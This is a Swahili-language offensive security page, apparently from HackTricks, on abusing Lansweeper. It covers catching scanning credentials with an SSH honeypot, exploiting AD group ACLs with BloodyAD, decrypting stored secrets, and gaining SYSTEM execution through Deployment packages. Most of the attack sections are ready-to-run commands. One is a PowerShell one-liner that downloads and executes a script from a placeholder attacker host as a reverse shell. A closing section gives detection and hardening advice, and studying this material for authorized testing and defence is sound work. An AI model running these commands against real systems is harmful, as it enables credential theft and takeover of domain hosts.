# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper ni platform ya IT asset discovery na inventory inayotumika sana kwenye Windows na kuunganishwa na Active Directory. Credentials zilizosanidiwa kwenye Lansweeper hutumiwa na scanning engines zake kufanya authentication kwenye assets kupitia protocols kama SSH, SMB/WMI na WinRM. Misconfigurations mara nyingi huruhusu:

- Credential interception kwa kuelekeza scanning target kwenye host inayodhibitiwa na attacker (honeypot)
- Kutumia vibaya AD ACLs zinazofichuliwa na makundi yanayohusiana na Lansweeper ili kupata remote access
- On-host decryption ya secrets zilizosanidiwa kwenye Lansweeper (connection strings na scanning credentials zilizohifadhiwa)
- Code execution kwenye managed endpoints kupitia Deployment feature (mara nyingi ikiendeshwa kama SYSTEM)

Ukurasa huu unatoa muhtasari wa attacker workflows na commands za kutumia vibaya tabia hizi wakati wa engagements.

## 1) Harvest scanning credentials kupitia honeypot (mfano wa SSH)

Wazo: tengeneza Scanning Target inayoelekeza kwenye host yako na uihusishe na Scanning Credentials zilizopo. Scan inapoendeshwa, Lansweeper itajaribu kufanya authentication kwa kutumia credentials hizo, na honeypot yako itazikamata.<sup>[[1]](#references)</sup>

Muhtasari wa hatua (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (au Single IP) = VPN IP yako
- Sanidi SSH port iwe inayofikika (kwa mfano, 2022 ikiwa 22 imezuiwa)
- Disable schedule na upange ku-trigger manually
- Scanning → Scanning Credentials → hakikisha Linux/SSH creds zipo; zihusishe na target mpya (enable zote inapohitajika)
- Bofya “Scan now” kwenye target
- Endesha SSH honeypot na upate username/password iliyojaribiwa

Mfano wa sshesame:<sup>[[2]](#references)</sup>
```yaml
# sshesame.yaml
server:
listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
-v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Thibitisha creds zilizokamatwa dhidi ya huduma za DC:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Notes
- Protocol nyingine si sawa: listener ya SMB/WinRM kwa kawaida hupata NTLM challenge-response badala ya password iliyo wazi. Ku-crack au ku-relay kunategemea ulinzi wa protocol uliokubaliwa; tazama [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). SSH password authentication kwa kawaida ndiyo hali rahisi zaidi ya cleartext.
- SSH public-key authentication huufichulia server username na public-key fingerprint, **si** private key au passphrase yake. Rejesha key-backed credentials kutoka kwenye server ya Lansweeper iliyoathiriwa badala ya kutarajia honeypot kuzifichua.<sup>[[2]](#references)</sup>
- Scanners wengi hujitambulisha kwa client banners za kipekee (kwa mfano, RebexSSH) na watajaribu commands zisizo na madhara (uname, whoami, n.k.).

### Mpangilio wa kuchagua credentials ni muhimu

Wakati wa rescan, Lansweeper hujaribu tena kwanza credential iliyofanikiwa mara ya mwisho kwa asset hiyo, kisha credentials zilizowekwa wazi kwa mpangilio uliosanidiwa, na mwishowe credential ya global ya aina hiyo hiyo. Honeypot inayokubali authentication ya kwanza ya password kwa hiyo kwa kawaida haitaona credentials za fallback zinazofuata; wakati wa authorized credential-path assessment, log na ukatae majaribio ikiwa lengo ni kuthibitisha mfuatano mzima wa fallback.<sup>[[6]](#references)</sup>

## 2) AD ACL abuse: pata remote access kwa kujiongeza kwenye app-admin group

Tumia BloodHound kuorodhesha effective rights kutoka kwenye account iliyoathiriwa. Ugunduzi wa kawaida ni group maalum ya scanner au app (kwa mfano, “Lansweeper Discovery”) yenye GenericAll juu ya privileged group (kwa mfano, “Lansweeper Admins”). Ikiwa privileged group hiyo pia ni member wa “Remote Management Users”, WinRM itapatikana mara tu tunapojiongeza.<sup>[[1]](#references)[[5]](#references)</sup>

Mifano ya ukusanyaji:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
Exploit GenericAll kwenye group kwa kutumia BloodyAD (Linux):<sup>[[4]](#references)</sup>
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Kisha pata shell shirikishi:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Kidokezo: Shughuli za Kerberos zinategemea muda. Ukikumbana na KRB_AP_ERR_SKEW, sawazisha na DC kwanza:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Decrypt Lansweeper-configured secrets on the host

Kwenye Lansweeper server, tovuti ya ASP.NET kwa kawaida huhifadhi connection string iliyosimbwa na symmetric key inayotumiwa na application. Ukiwa na local access inayofaa, unaweza decrypt DB connection string kisha kutoa scanning credentials zilizohifadhiwa.<sup>[[1]](#references)</sup>

Maeneo ya kawaida:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Tumia SharpLansweeperDecrypt ku-automate decryption na dumping ya creds zilizohifadhiwa. Bila arguments, executable ya sasa hu-decrypt `web.config`, huunganisha kwenye database na kudump scanning credentials zote zilizosanidiwa; `-e` pia inasaidia offline/manual decryption wakati encrypted value na key file tayari zinapatikana:<sup>[[3]](#references)</sup>
```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
-p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```
Matokeo yanayotarajiwa yanajumuisha maelezo ya muunganisho wa DB na credentials za scanning zilizo katika plaintext, kama vile akaunti za Windows na Linux zinazotumika katika mazingira yote. Hizi mara nyingi huwa na local rights zilizoinuliwa kwenye domain hosts:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Tumia creds za Windows scanning zilizopatikana kwa privileged access:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Kama mwanachama wa “Lansweeper Admins”, web UI inaonyesha Deployment na Configuration. Chini ya Deployment → Deployment packages, unaweza kuunda packages zinazoendesha commands za kiholela kwenye assets zilizolengwa. Lansweeper hutumia administrative scanning credential kufikia Task Scheduler na `C$` ya target, kisha huunda task kwa ajili ya deployment. Package inapotumia run mode ya **System Account**, payload hutekelezwa kama `NT AUTHORITY\SYSTEM`; run modes nyingine zinaweza kutumia scanning credential iliyomapishwa au user aliyeingia kwa sasa, kwa hiyo thibitisha mode iliyochaguliwa badala ya kudhani kuwa ni SYSTEM.<sup>[[1]](#references)[[7]](#references)</sup>

Hatua za kiwango cha juu:
- Unda Deployment package mpya inayoendesha one-liner ya PowerShell au cmd (reverse shell, add-user, n.k.).
- Lenga asset inayohitajika (kwa mfano, DC/host ambako Lansweeper inaendesha) na ubofye Deploy/Run now.
- Pokea shell yako kama SYSTEM.

Payload examples (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. Tumia kwa uangalifu.

### Deployment artifacts and a second credential exposure point

Scanner huandika deployment executable yake kwenye `C:\Windows\LSDeployment` kupitia `C$`. Package files kwa kawaida husomwa kutoka `DefaultPackageShare$`, inayotumia `C:\Program Files (x86)\Lansweeper\PackageShare`, au kutoka kwenye IP-range-specific package share. Muhimu, Lansweeper inaeleza kuwa package-share credential huhifadhiwa katika **reversibly encrypted form kwenye registry ya kila computer inayopokea deployment**. Chukulia managed endpoint iliyoathirika kuwa sehemu inayoweza kufichua akaunti hiyo ya share, na kagua deployment directory, scheduled-task history na package shares zilizosanidiwa unapounda upya shughuli za Lansweeper.<sup>[[7]](#references)</sup>

## Detection and hardening

- Zuia au ondoa anonymous SMB enumerations. Fuatilia RID cycling na access isiyo ya kawaida kwenye Lansweeper shares.
- Egress controls: zuia au punguza kwa ukali outbound SSH/SMB/WinRM kutoka scanner hosts. Toa alert kwenye ports zisizo za kawaida (kwa mfano, 2022) na client banners zisizo za kawaida kama Rebex.
- Linda `Website\\web.config` na `Key\\Encryption.txt`. Hamishia secrets kwenye vault na uzibadilishe zikifichuka. Zingatia service accounts zenye privileges chache na gMSA inapowezekana.
- AD monitoring: toa alert kuhusu mabadiliko kwenye groups zinazohusiana na Lansweeper (kwa mfano, “Lansweeper Admins”, “Remote Management Users”) na mabadiliko ya ACL yanayotoa GenericAll/Write membership kwenye privileged groups.
- Kagua uundaji/mabadiliko/utekelezaji wa Deployment packages na uhusianishe remote scheduled tasks mpya na uandishi kwenye `C:\Windows\LSDeployment`; toa alert kuhusu packages zinazoanzisha `cmd.exe`/`powershell.exe` au outbound connections zisizotarajiwa.
- Toa package-share credentials ruhusa ya **Read & Execute** pekee na usizitumie tena kwa administration. Pendelea agent-based inventory inapowezekana: ikiwa computers zote zinascan-wa na agent na deployment module haitumiki, Lansweeper haihitaji scanning credentials za computers zilizohifadhiwa.<sup>[[6]](#references)[[7]](#references)</sup>

## Related topics
- [SMB/LSA/SAMR enumeration na RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Kerberos authentication na mambo ya kuzingatia kuhusu clock-skew](kerberos-authentication.md)
- [BloodHound path analysis](bloodhound.md)
- [Matumizi ya WinRM na lateral movement](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Kutumia vibaya Lansweeper Scanning, AD ACLs, na Secrets ili Kumiliki DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Kuunda na ku-map scanning credentials — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Mahitaji ya Deployment — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
